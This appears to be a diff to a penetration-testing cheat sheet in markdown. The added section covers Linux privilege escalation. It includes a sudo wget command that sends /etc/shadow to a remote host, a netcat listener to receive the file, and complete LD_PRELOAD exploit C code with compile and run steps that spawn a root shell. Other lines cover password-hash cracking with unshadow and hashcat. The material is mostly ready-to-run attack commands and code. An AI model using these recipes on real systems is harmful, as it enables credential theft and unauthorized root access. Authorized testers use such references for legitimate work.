@@ -911,9 +911,7 @@ This will start a session handler and wait for incomming reverse shell requests.
 
 **Linux Enumeration**
 
-Show what a user is allowed to execute as sudo without giving a password
-
-    sudo -l
+*ARP*
 
 Show ARP Communication
 
@@ -951,7 +949,7 @@ https://www.tarasco.org/security/pwdump_7/
 
 Try to decrypt passwd and shadow file
 
-    unshadow PASSWORD-FILE SADOW-FILE
+    unshadow PASSWORD-FILE SHADOW-FILE
 
 remove everything expect the users 
 
@@ -963,6 +961,50 @@ https://hashcat.net/wiki/doku.php?id=example_hashes
     hashcat64.exe -m Algorithm_Type_number cred.txt rockyou.txt -O
     for example (1800)
 
+*GTFOBins*
+
+Show what a user is allowed to execute as sudo without giving a password
+
+    sudo -l
+
+Exploit what is possible with that - search for GTFOBins 
+https://gtfobins.github.io/ 
+Use to escalate
+
+*wget - Push /etc/shadow to remote location*
+
+    sudo wget --post-file=/etc/shadow <IP>:<PORT>
+
+Receive the file in NetCat
+
+    nc -nvlp <PORT>
+
+*LD_PRELOAD*
+
+if sudo -l gives you back and you have at least one entry that allows sudo without pw
+
+    env_keep+=LD_PRELOAD
+
+create a file - shell.c - with the following content to escalate
+
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    void _init(){
+        unsetenv("LD_PRELOAD");
+        setgid(0);
+        setuid(0);
+        system("/bin/bash");
+    }
+
+compile it with
+
+    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+start it with
+
+    sudo LD_PRELOAD=/home/USER/shell.so <something that can be executed as sudo e.g. apache2>
 
 
 **Windows PW Cracking**
